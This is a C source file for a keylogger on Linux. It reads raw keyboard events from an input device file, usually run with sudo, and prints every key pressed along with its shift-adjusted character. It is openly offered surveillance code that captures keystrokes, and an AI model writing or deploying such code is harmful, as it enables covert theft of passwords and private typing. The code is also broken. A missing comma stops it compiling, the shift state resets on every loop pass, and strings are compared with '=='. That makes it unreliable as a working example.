/***********************************************************************\
 *                                                                      *
 *  Simple stupid keylogger in C for Linux Kernel based devices         *
 *                                                                      *
 ***********************************************************************/

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <errno.h>
#include "keyboardMapping.h"

static const int ERROR_CODE = -1;

// Linux input event codes mapped in linux/include/uapi/linux/input-event-codes.h
// Note: such codes are necessary to translate everything that comes from the keyboard

// EV_KEY = 0x01 - Used to describe state changes of keyboards, buttons, or other key-like devices.

// perror function

int main(int argc, char *argv[])
{

    int fileDescriptor;
    struct input_event ie;

    if (argc != 2)
    {
        printf("Usage: ./keylogger <input-file-path>\n");
    }

    fileDescriptor = open(argv[1], O_RDONLY);

    if (fileDescriptor == ERROR_CODE)
    {
        printf("Error reading from input file - Error code: %d\n", fileDescriptor);

        if (errno == EACCES)
        {
            printf("Please launch this program with 'sudo'\n");
        }

        return -1;
    }

    /*
        In the kernel, the struct input_events defined in input.h has the following fields:
            - time: Timestamp at which the event happened
            - type: Event type, like EV_KEY
            - code: Event code, in this case the key pressed
            - value: value the event carries

    */

    while (read(fileDescriptor, &ie, sizeof(ie)) == sizeof(ie))
    {

        int shift = 0;

        // Ignore non-keyboard input
        if (ie.type != EV_KEY)
            continue;

        // Track shift status
        if (ie.code == keymap[42] || ie.code == keymap[54])
        {
            shift = (ie.value == KEY_PRESSED || ie.value == KEY_REPEAT);
            continue;
        }

        // Ignore everything that's not key presses or repeats
        if (!(ie.value == KEY_PRESSED || ie.value == KEY_REPEAT))
            continue;

        if (ie.code < KEYMAP_SIZE && ie.code != NULL)
        {

            if (shift && keymap[ie.code][1] == "\0")

                printf("Key pressed: %c\n", keymap[ie.code][0] - 32);

            else
                printf("Key pressed: %c\n", keymap[ie.code][0]);

            fflush(stdout);
        } else {
            printf("Unknown code: %d\n" ie.code);
        }
    }

    return 0;
}